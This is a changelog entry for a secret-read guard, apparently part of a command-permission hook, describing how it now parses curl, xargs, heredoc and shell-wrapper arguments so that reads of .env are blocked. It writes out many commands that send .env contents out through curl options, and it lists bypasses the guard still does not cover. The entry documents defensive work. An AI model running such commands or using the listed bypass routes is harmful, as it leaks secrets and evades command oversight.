**The secret-read guard blocks a secret file named inside a curl option value** — `curl -d @.env` was denied, but curl opens `.env` just the same for `curl -d@.env`, `curl -sd@.env`, `curl -F file=@.env`, `curl -F "file=<.env"`, `curl --data-urlencode k@.env` and `curl --cert .env:pw`, and those were allowed. The guard now reads curl's arguments as curl does when curl is the command, and behind `sudo`, `xargs`, `find -exec` and the launchers it lists (`watch`, `npx`, `docker exec`, `uv run` and others), while a `curl` word that is another command's operand is left alone (`grep curl 'x@.env' f`). Words a `printf` or `echo` prints into `xargs` are read as printed, escapes decoded (`printf -- '-d\n@.env\n' | xargs curl x`, `printf '.env\n' | xargs cat`), and so are the words of a here-string or heredoc given to `xargs` itself, or printed into it by a bare `cat`, also through `tee` or another bare `cat` (`xargs curl x <<< '-d @.env'`, `cat <<EOF | xargs cat`); a shell's `-c` script is read past the options after `-c`, each `o` or `O` in a cluster taking the next word, and a `-c` inside a cluster among the options before the script is read too (`bash -c -- 'cat .env'`, `sh -c -euo nounset 'cat .env'`, `bash -ce 'cat .env'`). It also reads the command behind a shell keyword, an assignment the shell or a wrapper reads, or a named fd (`if true; then bash -c 'cat .env'; fi`, `! curl -d@.env x`, `A+=b curl -d@.env x`, `a[x y]=1 curl -d@.env x`, `{fd}>/dev/null curl -d@.env x`, `sudo A=b curl -d@.env x`), on top of what it checked there before; `if [ -f .env ]; then …` stays denied. Some commands that read no secret are newly denied, among them a URL's `user@` part in `curl 'http://user@.env/'`, `curl -H 'Host: a@.env.com'`, and `curl --form-string f=@.env` and `curl --data-urlencode n=@.env`, which curl sends as text; `echo '\x2eenv' | xargs cat`, which zsh's echo decodes and bash's does not without `-e`; a word `printf` or `echo` prints, or a here-string or heredoc gives, into `xargs`, read with the fail-safe readings a written word gets (`printf 'k=@\x2eenv\n' | xargs curl x`), and also as `xargs` hands it on with its quotes removed, under `-0` or `-d` too; a here-string or heredoc `xargs` does not read, given to a `cat` whose output is redirected or that changes it (`cat <<EOF > f | xargs cat`, `cat -A <<EOF | xargs cat`), on another fd, replaced by a later redirect, or beside an arg file spelled other than `-a f` (`xargs cat 3<<< .env`, `xargs cat <<< .env < f`, `xargs -ra f cat <<< .env`); a quoted cert option inside a longer line `xargs -I` hands on whole (`echo '"-o" out "-E" c.pem' | xargs -I{} curl x {} .env:pw`); a `printf`, `echo`, here-string or heredoc into `xargs` whose text spends the scan budget, each character charged for the words cut from it, denied as too complex at a size that depends on the line's shape, and so are piped words `xargs` runs as a whole shell script (`… | xargs sh -c`), each charged likewise; a `curl` word in a command that a launcher the guard lists runs, whose options it does not read, so the words after it are read as curl's (`caffeinate grep curl 'x@.env' f`, also behind `watch`, `npx`, `uv run` and `docker exec`); a line nested too deep to read behind a word this reading looks past and the first does not (`A+=b bash -c '…'`), denied as too complex as the same line is without that word; and a line too large for this reading to finish on a scan budget of its own, the size the first reading gets, denied as too complex (a line with a subscript assignment at a command's start, which this reading reads twice). Not covered: a curl the guard does not resolve as a command (`env -S 'curl …'`, `ssh host curl …`, `nix run nixpkgs#curl -- …`, `docker run curl:8.5.0`, a launcher, `xargs` or `find -exec` at a fourth level of `xargs` or `find -exec` (`xargs xargs xargs xargs curl …`), `coproc`'s name in front of a compound command (`coproc x if curl …; then …`), a command it does not list as running another, or a command given as one string to a program the guard does not read it for, as in `docker exec c sh -c 'curl …'`); zsh's short `if [[ a && b ]] cmd`, where a word of the test ends the guard's segment (`&&`, `||`, `(`, `{`, a newline); a `((` whose body holds a `$(…)` with a case pattern or a comment, which can end that `$(…)` early for the guard; a named fd written right after a case pattern's `)` with no blank between (`case x in x){fd}>f curl …`); a curl value the shell builds when it runs the line, from a variable, a command substitution, a glob or a brace expansion (`curl -d @$f`, `curl -d @$(echo .env)`, `curl -T .e*`, `curl -d@{a,.env}`), a whole curl command held in a variable (`bash -c "$c"`), or printed by a command substitution, under `eval` or not (`eval "$(echo 'curl …')"`, `$(echo curl …)`); a file `xargs` reads its words from (`xargs curl x < list`); a file named inside a curl config (`-K cfg`, `-K -`); curl's `{a,b}` globbing in an upload or `file://` name; and a name built from `--variable` values in an `--expand-*` option. (#5779)
